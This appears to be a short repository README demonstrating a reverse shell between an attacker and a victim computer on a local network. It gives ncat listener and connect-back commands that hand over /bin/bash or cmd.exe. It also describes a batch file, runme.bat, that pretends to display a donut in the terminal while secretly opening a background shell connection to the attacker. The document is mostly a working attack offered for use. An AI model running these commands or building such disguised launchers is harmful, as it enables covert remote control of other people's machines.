# Reverse Shell Demo

## This demo is done between 2 computers on the same network, a server (attacker computer), and a client (victim computer). This can be done on a remote target but local targets are faster for a demo, result is identical.

### 1) Install NetCat/Nmap


### 2) Set up a listening server:
Run `ncat -lvnp <port>`


### 3) Connect client to server:
**On Linux/Bash:**

Run `ncat <server-internal-ip> <port> -e /bin/bash`

**On Windows:**

Run `ncat <server-internal-ip> <port> -e cmd.exe`

*To find the internal IP run `hostname I` on Linux OR `ipconfig` on Windows.*


## For the zero day demo, target should clone/download this repo, placing `donut.py` and `runme.bat` in the same directory.
### When the victim executes `runme.bat` to "display" the Donut in their terminal, another CMD windows open in the background that connects to the attacking server.
